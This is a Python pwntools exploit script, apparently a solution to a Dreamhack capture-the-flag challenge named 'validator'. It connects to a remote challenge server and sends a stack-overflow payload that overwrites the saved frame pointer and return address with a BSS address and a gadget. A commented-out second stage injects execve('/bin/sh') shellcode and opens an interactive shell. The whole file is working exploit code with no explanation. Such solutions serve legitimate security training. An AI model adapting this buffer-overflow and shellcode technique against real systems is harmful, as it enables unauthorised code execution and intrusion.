from pwn import*
#p = process('./validator')
p = remote('host5.dreamhack.games',18450)
context(arch = "amd64", os = "linux")

### GADGET
RLR = 0x400658
bss = 0x601000 + 0x100
shellcode = asm(
	'''
	add rsp, 0x100
	mov rax, 0x0068732f6e69622f
	push rax

	mov rdi, rsp
	xor rsi, rsi
	xor rdx, rdx
	mov rax, 59
	syscall

	'''
)



### EXPLOIT
# stage 1 
pay = ''
pay += "DREAMHACK!"

val = 0x7f - 0xa + 0x1
for i in range(0x80-len(pay)):
	pay += p8(val)
	val -= 1

pay += p64(bss)	# -- sfp
pay += p64(RLR) # -- ret
p.send(pay)
'''
# stage 2
pay = ""
pay += "DREAMHACK!"

val = 0x7f - 0xa + 0x1
for i in range(0x80-len(pay)):
	pay += p8(val)
	val -= 1

pay += p64(bss)	# -- sfp
pay += p64(bss+0x10)
pay += shellcode
p.send(pay)
'''
p.interactive()